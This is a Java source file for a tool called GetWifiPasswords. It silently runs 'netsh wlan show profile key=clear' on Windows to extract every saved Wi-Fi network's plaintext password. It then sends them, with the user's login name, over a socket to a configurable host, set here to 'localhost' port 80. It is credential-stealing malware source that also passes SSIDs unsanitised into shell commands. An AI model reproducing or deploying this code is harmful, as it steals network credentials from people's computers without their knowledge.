package getwifipasswords;

import static getwifipasswords.GetWifiPasswords.FINAL_DATA;
import static getwifipasswords.GetWifiPasswords.br;
import static getwifipasswords.GetWifiPasswords.username;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.logging.Level;
import java.util.logging.Logger;

public class GetWifiPasswords {
    
    public static final String br = System.getProperty("line.separator");
    public static String username;
    public static String os;
    public static String lang;
    
    public static String CLAVE = "clave";
    
    public static String FINAL_DATA = "";
    
    public static void main(String[] args) throws Exception {
        Locale locale = Locale.getDefault();
        lang = locale.getDisplayLanguage();
        os = System.getProperty("os.name");
        os = os.toLowerCase();
        //System.out.println("System: "+os);
        
        setupCommands(lang);
        
        //System.out.println("Username: "+username);
        //System.out.println("\nSaved networks:\n");
        if (os.contains("win"))
            getWindowsPasswords();
        //System.out.println("\n\nBy izanbf1803.........izanbf.esy.es");
    }
    
    public static void setupCommands(String LANG){
        username = System.getProperty("user.name");
        
        if (lang == "español") CLAVE = "clave";
        else if (lang == "") CLAVE = "";
    }
    
    public static void getWindowsPasswords() throws IOException, InterruptedException{
        String[] netData;
        List<String> wifis = new ArrayList<String>();
        netData = cmd("netsh wlan show profile key=clear");
        int startToSave = 0;
        for (int i=0, j=0;i<=netData.length;i++){
            if (netData[i] == null) break; 
            if (startToSave == 1) j++;
            if (netData[i].equals("-------------------") && startToSave == 0)
                startToSave = 1;
            else if(startToSave == 1)
                wifis.add(netData[i]);
        }
        String[] finalWifiData = new String[wifis.size()];
        String x = "";
        for(int i=0,j=0;i<wifis.size();i++){
           if (wifis.get(i) != null)
               x = wifis.get(i).substring(wifis.get(i).indexOf(":")+1,wifis.get(i).length());
               finalWifiData[j] = x;
               j++;
        }
        for(int i=0;i<finalWifiData.length-1;i++) {
            finalWifiData[i] += " : "+getPassword(finalWifiData[i]);
        }
        for(int i=0;i<finalWifiData.length-1;i++) {
            FINAL_DATA += (i < finalWifiData.length-2) ? finalWifiData[i]+br : finalWifiData[i];
        }
        //System.out.println(FINAL_DATA);
        Cliente client = new Cliente(80,"localhost");
        new Thread(client).start();
    }    
    public static String getPassword(String SSID) throws IOException{
        String[] pass = new String[99];
        String finalPass = "NOT_FOUND";
        pass = cmd("netsh wlan show profile "+SSID+" key=clear");
        for (int i=0;i<pass.length;i++){
            if (pass[i].contains(CLAVE)){
                finalPass = pass[i].substring(pass[i].indexOf(":")+1,pass[i].length());
                break;
            }
        }
        return finalPass;
    }
    
    public static String[] cmd(String command) throws IOException {
        ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        String[] lines = new String[99];
        int i = 0;
        while (true) {
            line = r.readLine();
            if (line == null) { break; }
            lines[i] = line;
            i++;
        }
        return lines;
    }   
}

class Cliente implements Runnable{
        
        private int PUERTO;
        private String HOST; 
        protected Socket cs;
        protected DataOutputStream salidaServidor;
        
        Cliente (int puerto, String host) throws IOException, InterruptedException{
            this.PUERTO = puerto;
            this.HOST = host;
        }

        @Override
        public void run(){ 
            try { 
                try {
                    cs = new Socket(HOST, PUERTO);
                } catch (IOException ex) {
                    Logger.getLogger(Cliente.class.getName()).log(Level.SEVERE, null, ex);
                }
                
                salidaServidor = new DataOutputStream(cs.getOutputStream());
                
                salidaServidor.writeUTF(username+br+FINAL_DATA);
                
                BufferedReader entrada = new BufferedReader(new InputStreamReader(cs.getInputStream()));
                
                cs.close();
            } catch (IOException ex) {
                Logger.getLogger(Cliente.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }